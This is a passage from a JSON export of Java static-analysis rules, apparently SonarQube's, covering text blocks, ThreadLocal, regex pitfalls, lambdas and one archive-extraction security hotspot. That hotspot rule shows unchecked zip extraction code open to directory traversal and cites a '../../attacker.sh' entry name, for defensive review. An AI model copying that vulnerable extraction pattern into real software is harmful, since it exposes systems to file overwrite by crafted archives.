            "mdDesc": "<p>In Java 15 Text Blocks are now official and can be used. The most common pattern for multiline strings in Java &lt; 15 was to write String\nconcatenation. Now it's possible to do it in a more natural way using Text Blocks.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString textBlock =\n               \"&lt;html&gt;\\n\" +\n               \"    &lt;body&gt;\\n\" +\n               \"        &lt;tag&gt;\\n\" +\n               \"        &lt;/tag&gt;\\n\" +\n               \"    &lt;/body&gt;\\n\" +\n               \"&lt;/html&gt;\";\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString textBlock = \"\"\"\n        &lt;html&gt;\n            &lt;body&gt;\n                &lt;tag&gt;\n                &lt;/tag&gt;\n            &lt;/body&gt;\n        &lt;/html&gt;\"\"\";\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://openjdk.java.net/jeps/368\">JEP 368: Text Blocks</a> (Second Preview) </li>\n  <li> <a href=\"https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html\">Programmer's Guide To Text Blocks</a>, by Jim Laskey and Stuart\n  Marks </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java15"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4065",
            "repo": "java",
            "name": "\"ThreadLocal.withInitial\" should be preferred",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Java 8 introduced <code>ThreadLocal.withInitial</code> which is a simpler alternative to creating an anonymous inner class to initialise a\n<code>ThreadLocal</code> instance.</p>\n<p>This rule raises an issue when a <code>ThreadLocal</code> anonymous inner class can be replaced by a call to\n<code>ThreadLocal.withInitial</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nThreadLocal&lt;List&lt;String&gt;&gt; myThreadLocal =\n    new ThreadLocal&lt;List&lt;String&gt;&gt;() { // Noncompliant\n        @Override\n        protected List&lt;String&gt; initialValue() {\n            return new ArrayList&lt;String&gt;();\n        }\n    };\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nThreadLocal&lt;List&lt;String&gt;&gt; myThreadLocal = ThreadLocal.withInitial(ArrayList::new);\n</pre>",
            "mdDesc": "<p>Java 8 introduced <code>ThreadLocal.withInitial</code> which is a simpler alternative to creating an anonymous inner class to initialise a\n<code>ThreadLocal</code> instance.</p>\n<p>This rule raises an issue when a <code>ThreadLocal</code> anonymous inner class can be replaced by a call to\n<code>ThreadLocal.withInitial</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nThreadLocal&lt;List&lt;String&gt;&gt; myThreadLocal =\n    new ThreadLocal&lt;List&lt;String&gt;&gt;() { // Noncompliant\n        @Override\n        protected List&lt;String&gt; initialValue() {\n            return new ArrayList&lt;String&gt;();\n        }\n    };\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nThreadLocal&lt;List&lt;String&gt;&gt; myThreadLocal = ThreadLocal.withInitial(ArrayList::new);\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S6001",
            "repo": "java",
            "name": "Back references in regular expressions should only refer to capturing groups that are matched before the reference",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When a back reference in a regex refers to a capturing group that hasn't been defined yet (or at all), it can never be matched. Named back\nreferences throw a <code>PatternSyntaxException</code> in that case; numeric back references fail silently when they can't match, simply making the\nmatch fail.</p>\n<p>When the group is defined before the back reference but on a different control path (like in <code>(.)|\\1</code> for example), this also leads to a\nsituation where the back reference can never match.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern.compile(\"\\\\1(.)\"); // Noncompliant, group 1 is defined after the back reference\nPattern.compile(\"(.)\\\\2\"); // Noncompliant, group 2 isn't defined at all\nPattern.compile(\"(.)|\\\\1\"); // Noncompliant, group 1 and the back reference are in different branches\nPattern.compile(\"(?&lt;x&gt;.)|\\\\k&lt;x&gt;\"); // Noncompliant, group x and the back reference are in different branches\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"(.)\\\\1\");\nPattern.compile(\"(?&lt;x&gt;.)\\\\k&lt;x&gt;\");\n</pre>",
            "mdDesc": "<p>When a back reference in a regex refers to a capturing group that hasn't been defined yet (or at all), it can never be matched. Named back\nreferences throw a <code>PatternSyntaxException</code> in that case; numeric back references fail silently when they can't match, simply making the\nmatch fail.</p>\n<p>When the group is defined before the back reference but on a different control path (like in <code>(.)|\\1</code> for example), this also leads to a\nsituation where the back reference can never match.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern.compile(\"\\\\1(.)\"); // Noncompliant, group 1 is defined after the back reference\nPattern.compile(\"(.)\\\\2\"); // Noncompliant, group 2 isn't defined at all\nPattern.compile(\"(.)|\\\\1\"); // Noncompliant, group 1 and the back reference are in different branches\nPattern.compile(\"(?&lt;x&gt;.)|\\\\k&lt;x&gt;\"); // Noncompliant, group x and the back reference are in different branches\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"(.)\\\\1\");\nPattern.compile(\"(?&lt;x&gt;.)\\\\k&lt;x&gt;\");\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S6002",
            "repo": "java",
            "name": "Regex lookahead assertions should not be contradictory",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Lookahead assertions are a regex feature that makes it possible to look ahead in the input without consuming it. It is often used at the end of\nregular expressions to make sure that substrings only match when they are followed by a specific pattern.</p>\n<p>However, they can also be used in the middle (or at the beginning) of a regex. In that case there is the possibility that what comes after the\nlookahead does not match the pattern inside the lookahead. This makes the lookahead impossible to match and is a sign that there's a mistake in the\nregular expression that should be fixed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern.compile(\"(?=a)b\"); // Noncompliant, the same character can't be equal to 'a' and 'b' at the same time\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"(?&lt;=a)b\");\nPattern.compile(\"a(?=b)\");\n</pre>",
            "mdDesc": "<p>Lookahead assertions are a regex feature that makes it possible to look ahead in the input without consuming it. It is often used at the end of\nregular expressions to make sure that substrings only match when they are followed by a specific pattern.</p>\n<p>However, they can also be used in the middle (or at the beginning) of a regex. In that case there is the possibility that what comes after the\nlookahead does not match the pattern inside the lookahead. This makes the lookahead impossible to match and is a sign that there's a mistake in the\nregular expression that should be fixed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nPattern.compile(\"(?=a)b\"); // Noncompliant, the same character can't be equal to 'a' and 'b' at the same time\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"(?&lt;=a)b\");\nPattern.compile(\"a(?=b)\");\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S6019",
            "repo": "java",
            "name": "Reluctant quantifiers in regular expressions should be followed by an expression that can't match the empty string",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When a reluctant quantifier (such as <code>*?</code> or <code>+?</code>) is followed by a pattern that can match the empty string or directly by\nthe end of the regex, it will always match the empty string when used with methods that find partial matches (such as <code>find</code>,\n<code>replaceAll</code>, <code>split</code> etc.).</p>\n<p>Similarly, when used with methods that find full matches, a reluctant quantifier that's followed directly by the end of the regex (or a pattern\nthat always matches the empty string, such as <code>()</code>) behaves indistinguishably from a greedy quantifier while being less efficient.</p>\n<p>This is likely a sign that the regex does not work as intended.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nstr.split(\".*?x?\"); // Noncompliant, this will behave just like \"x?\"\nstr.matches(\".*?\"); // Noncompliant, replace with \".*\"\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nstr.split(\".*?x\");\nstr.matches(\".*\");\n</pre>",
            "mdDesc": "<p>When a reluctant quantifier (such as <code>*?</code> or <code>+?</code>) is followed by a pattern that can match the empty string or directly by\nthe end of the regex, it will always match the empty string when used with methods that find partial matches (such as <code>find</code>,\n<code>replaceAll</code>, <code>split</code> etc.).</p>\n<p>Similarly, when used with methods that find full matches, a reluctant quantifier that's followed directly by the end of the regex (or a pattern\nthat always matches the empty string, such as <code>()</code>) behaves indistinguishably from a greedy quantifier while being less efficient.</p>\n<p>This is likely a sign that the regex does not work as intended.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nstr.split(\".*?x?\"); // Noncompliant, this will behave just like \"x?\"\nstr.matches(\".*?\"); // Noncompliant, replace with \".*\"\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nstr.split(\".*?x\");\nstr.matches(\".*\");\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5042",
            "repo": "java",
            "name": "Expanding archive files is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Expanding archive files is security-sensitive. For example, expanding archive files has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1263\">CVE-2018-1263</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16131\">CVE-2018-16131</a> </li>\n</ul>\n<p>Applications that expand archive files (zip, tar, jar, war, 7z, ...) should verify the path where the archive's files are expanded and not trust\nblindly the content of the archive. Archive's files should not be expanded outside of the root directory where the archive is supposed to be expanded.\nAlso, applications should control the size of the expanded data to not be a victim of Zip Bomb attack. Failure to do so could allow an attacker to use\na specially crafted archive that holds directory traversal paths (e.g. ../../attacker.sh) or the attacker could overload the file system, processors\nor memory of the operating system where the archive is expanded making the target OS completely unusable.</p>\n<p>This rule raises an issue when code handle archives. The goal is to guide security code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> there is no validation of the name of the archive entry </li>\n  <li> there is no validation of the effective path where the archive entry is going to be expanded </li>\n  <li> there is no validation of the size of the expanded archive entry </li>\n  <li> there is no validation of the ratio between the compressed and uncompressed archive entry </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<p> </p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Validate the full path of the extracted file against the full path of the directory where files are uncompressed.\n    <ul>\n      <li> the canonical path of the uncompressed file must start with the canonical path of the directory where files are extracted. </li>\n      <li> the name of the archive entry must not contain \"..\", i.e. reference to a parent directory. </li>\n    </ul> </li>\n</ul>\n<pre>\nString canonicalDirPath = outputDir.getCanonicalPath();\nString canonicalDestPath = targetFile.getCanonicalPath();\n\nif (!canonicalDestPath.startsWith(canonicalDirPath + File.separator)) { // Sanitizer\n  throw new ArchiverException(\"Entry is trying to leave the target dir: \" + zipEntry.getName());\n}\n</pre>\n<ul>\n  <li> Stop extracting the archive if any of its entries has been tainted with a directory traversal path. </li>\n  <li> Define and control the ratio between compressed and uncompress bytes. </li>\n  <li> Define and control the maximum allowed uncompressed file size. </li>\n  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold.\n  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\njava.util.zip.ZipFile zipFile = new ZipFile(zipFileName);\n\nEnumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();\nwhile (entries.hasMoreElements()) {\n  ZipEntry e = entries.nextElement(); // Sensitive\n  File f = new File(outputDir, e.getName());\n  InputStream input = zipFile.getInputStream(e);\n  extractFile(new ZipInputStream(input), outputDir, e.getName());\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule doesn't raise an issue when a ZipEntry or a ArchiveEntry:</p>\n<ul>\n  <li> is declared as a class field </li>\n  <li> is a parameter of an abstract method of an <code>interface</code> or <code>abstract</code> class </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control\">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/409.html\">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream\">CERT, IDS04-J.</a> - Safely\n  extract files from ZipInputStream </li>\n  <li> Snyk Research Team: <a href=\"https://snyk.io/research/zip-slip-vulnerability\">Zip Slip Vulnerability</a> </li>\n</ul>",
            "mdDesc": "<p>Expanding archive files is security-sensitive. For example, expanding archive files has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1263\">CVE-2018-1263</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16131\">CVE-2018-16131</a> </li>\n</ul>\n<p>Applications that expand archive files (zip, tar, jar, war, 7z, ...) should verify the path where the archive's files are expanded and not trust\nblindly the content of the archive. Archive's files should not be expanded outside of the root directory where the archive is supposed to be expanded.\nAlso, applications should control the size of the expanded data to not be a victim of Zip Bomb attack. Failure to do so could allow an attacker to use\na specially crafted archive that holds directory traversal paths (e.g. ../../attacker.sh) or the attacker could overload the file system, processors\nor memory of the operating system where the archive is expanded making the target OS completely unusable.</p>\n<p>This rule raises an issue when code handle archives. The goal is to guide security code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> there is no validation of the name of the archive entry </li>\n  <li> there is no validation of the effective path where the archive entry is going to be expanded </li>\n  <li> there is no validation of the size of the expanded archive entry </li>\n  <li> there is no validation of the ratio between the compressed and uncompressed archive entry </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<p> </p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Validate the full path of the extracted file against the full path of the directory where files are uncompressed.\n    <ul>\n      <li> the canonical path of the uncompressed file must start with the canonical path of the directory where files are extracted. </li>\n      <li> the name of the archive entry must not contain \"..\", i.e. reference to a parent directory. </li>\n    </ul> </li>\n</ul>\n<pre>\nString canonicalDirPath = outputDir.getCanonicalPath();\nString canonicalDestPath = targetFile.getCanonicalPath();\n\nif (!canonicalDestPath.startsWith(canonicalDirPath + File.separator)) { // Sanitizer\n  throw new ArchiverException(\"Entry is trying to leave the target dir: \" + zipEntry.getName());\n}\n</pre>\n<ul>\n  <li> Stop extracting the archive if any of its entries has been tainted with a directory traversal path. </li>\n  <li> Define and control the ratio between compressed and uncompress bytes. </li>\n  <li> Define and control the maximum allowed uncompressed file size. </li>\n  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold.\n  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\njava.util.zip.ZipFile zipFile = new ZipFile(zipFileName);\n\nEnumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();\nwhile (entries.hasMoreElements()) {\n  ZipEntry e = entries.nextElement(); // Sensitive\n  File f = new File(outputDir, e.getName());\n  InputStream input = zipFile.getInputStream(e);\n  extractFile(new ZipInputStream(input), outputDir, e.getName());\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule doesn't raise an issue when a ZipEntry or a ArchiveEntry:</p>\n<ul>\n  <li> is declared as a class field </li>\n  <li> is a parameter of an abstract method of an <code>interface</code> or <code>abstract</code> class </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control\">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/409.html\">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream\">CERT, IDS04-J.</a> - Safely\n  extract files from ZipInputStream </li>\n  <li> Snyk Research Team: <a href=\"https://snyk.io/research/zip-slip-vulnerability\">Zip Slip Vulnerability</a> </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "owasp-a5"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S5164",
            "repo": "java",
            "name": "\"ThreadLocal\" variables should be cleaned up when no longer used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>ThreadLocal</code> variables are supposed to be garbage collected once the holding thread is no longer alive. Memory leaks can occur when\nholding threads are re-used which is the case on application servers using pool of threads.</p>\n<p>To avoid such problems, it is recommended to always clean up <code>ThreadLocal</code> variables using the <code>remove()</code> method to remove\nthe current thread’s value for the <code>ThreadLocal</code> variable.</p>\n<p>In addition, calling <code>set(null)</code> to remove the value might keep the reference to <code>this</code> pointer in the map, which can cause\nmemory leak in some scenarios. Using <code>remove</code> is safer to avoid this issue.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class ThreadLocalUserSession implements UserSession {\n\n  private static final ThreadLocal&lt;UserSession&gt; DELEGATE = new ThreadLocal&lt;&gt;();\n\n  public UserSession get() {\n    UserSession session = DELEGATE.get();\n    if (session != null) {\n      return session;\n    }\n    throw new UnauthorizedException(\"User is not authenticated\");\n  }\n\n  public void set(UserSession session) {\n    DELEGATE.set(session);\n  }\n\n   public void incorrectCleanup() {\n     DELEGATE.set(null); // Noncompliant\n   }\n\n  // some other methods without a call to DELEGATE.remove()\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class ThreadLocalUserSession implements UserSession {\n\n  private static final ThreadLocal&lt;UserSession&gt; DELEGATE = new ThreadLocal&lt;&gt;();\n\n  public UserSession get() {\n    UserSession session = DELEGATE.get();\n    if (session != null) {\n      return session;\n    }\n    throw new UnauthorizedException(\"User is not authenticated\");\n  }\n\n  public void set(UserSession session) {\n    DELEGATE.set(session);\n  }\n\n  public void unload() {\n    DELEGATE.remove(); // Compliant\n  }\n\n  // ...\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Rule will not detect non-private <code>ThreadLocal</code> variables, because <code>remove()</code> can be called from another class.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/java-memory-leaks\">Understanding Memory Leaks in Java</a> </li>\n</ul>",
            "mdDesc": "<p><code>ThreadLocal</code> variables are supposed to be garbage collected once the holding thread is no longer alive. Memory leaks can occur when\nholding threads are re-used which is the case on application servers using pool of threads.</p>\n<p>To avoid such problems, it is recommended to always clean up <code>ThreadLocal</code> variables using the <code>remove()</code> method to remove\nthe current thread’s value for the <code>ThreadLocal</code> variable.</p>\n<p>In addition, calling <code>set(null)</code> to remove the value might keep the reference to <code>this</code> pointer in the map, which can cause\nmemory leak in some scenarios. Using <code>remove</code> is safer to avoid this issue.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class ThreadLocalUserSession implements UserSession {\n\n  private static final ThreadLocal&lt;UserSession&gt; DELEGATE = new ThreadLocal&lt;&gt;();\n\n  public UserSession get() {\n    UserSession session = DELEGATE.get();\n    if (session != null) {\n      return session;\n    }\n    throw new UnauthorizedException(\"User is not authenticated\");\n  }\n\n  public void set(UserSession session) {\n    DELEGATE.set(session);\n  }\n\n   public void incorrectCleanup() {\n     DELEGATE.set(null); // Noncompliant\n   }\n\n  // some other methods without a call to DELEGATE.remove()\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class ThreadLocalUserSession implements UserSession {\n\n  private static final ThreadLocal&lt;UserSession&gt; DELEGATE = new ThreadLocal&lt;&gt;();\n\n  public UserSession get() {\n    UserSession session = DELEGATE.get();\n    if (session != null) {\n      return session;\n    }\n    throw new UnauthorizedException(\"User is not authenticated\");\n  }\n\n  public void set(UserSession session) {\n    DELEGATE.set(session);\n  }\n\n  public void unload() {\n    DELEGATE.remove(); // Compliant\n  }\n\n  // ...\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Rule will not detect non-private <code>ThreadLocal</code> variables, because <code>remove()</code> can be called from another class.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/java-memory-leaks\">Understanding Memory Leaks in Java</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "leak",
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1610",
            "repo": "java",
            "name": "Abstract classes without fields should be converted to interfaces",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>With Java 8's \"default method\" feature, any abstract class without direct or inherited field should be converted into an interface. However, this\nchange may not be appropriate in libraries or other applications where the class is intended to be used as an API.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic abstract class Car {\n  public abstract void start(Environment c);\n\n  public void stop(Environment c) {\n    c.freeze(this);\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic interface Car {\n  public void start(Environment c);\n\n  public default void stop(Environment c) {\n    c.freeze(this);\n  }\n}\n</pre>",
            "mdDesc": "<p>With Java 8's \"default method\" feature, any abstract class without direct or inherited field should be converted into an interface. However, this\nchange may not be appropriate in libraries or other applications where the class is intended to be used as an API.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic abstract class Car {\n  public abstract void start(Environment c);\n\n  public void stop(Environment c) {\n    c.freeze(this);\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic interface Car {\n  public void start(Environment c);\n\n  public default void stop(Environment c) {\n    c.freeze(this);\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1850",
            "repo": "java",
            "name": "\"instanceof\" operators that always return \"true\" or \"false\" should be removed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>instanceof</code> operators that always return <code>true</code> or <code>false</code> are either useless or the result of a misunderstanding\nwhich could lead to unexpected behavior in production.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic boolean isSuitable(Integer param) {\n...\n  String name = null;\n\n  if (name instanceof String) { // Noncompliant; always false since name is null\n    //...\n  }\n\n  if(param instanceof Number) {  // Noncompliant; always true unless param is null, because param is an Integer\n    doSomething();\n  }\n...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic boolean isSuitable(Integer param) {\n...\n  doSomething();\n...\n}\n</pre>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use <a href='/coding_rules#rule_key=java%3AS2589'>S2589</a> instead.</p>",
            "mdDesc": "<p><code>instanceof</code> operators that always return <code>true</code> or <code>false</code> are either useless or the result of a misunderstanding\nwhich could lead to unexpected behavior in production.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic boolean isSuitable(Integer param) {\n...\n  String name = null;\n\n  if (name instanceof String) { // Noncompliant; always false since name is null\n    //...\n  }\n\n  if(param instanceof Number) {  // Noncompliant; always true unless param is null, because param is an Integer\n    doSomething();\n  }\n...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic boolean isSuitable(Integer param) {\n...\n  doSomething();\n...\n}\n</pre>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use {rule:java:S2589} instead.</p>",
            "severity": "MAJOR",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1612",
            "repo": "java",
            "name": "Lambdas should be replaced with method references",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Method/constructor references are commonly agreed to be, most of the time, more compact and readable than using lambdas, and are therefore\npreferred. </p>\n<p>In some rare cases, when it is not clear from the context what kind of function is being described and reference would not increase the clarity, it\nmight be fine to keep the lambda. </p>\n<p>Similarly, <code>null</code> checks can be replaced with references to the <code>Objects::isNull</code> and <code>Objects::nonNull</code>\nmethods.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass A {\n  void process(List&lt;A&gt; list) {\n    list.stream()\n      .map(a -&gt; a.&lt;String&gt;getObject())\n      .forEach(a -&gt; { System.out.println(a); });\n  }\n\n  &lt;T&gt; T getObject() {\n    return null;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass A {\n  void process(List&lt;A&gt; list) {\n    list.stream()\n      .map(A::&lt;String&gt;getObject)\n      .forEach(System.out::println);\n  }\n\n  &lt;T&gt; T getObject() {\n    return null;\n  }\n}\n</pre>",
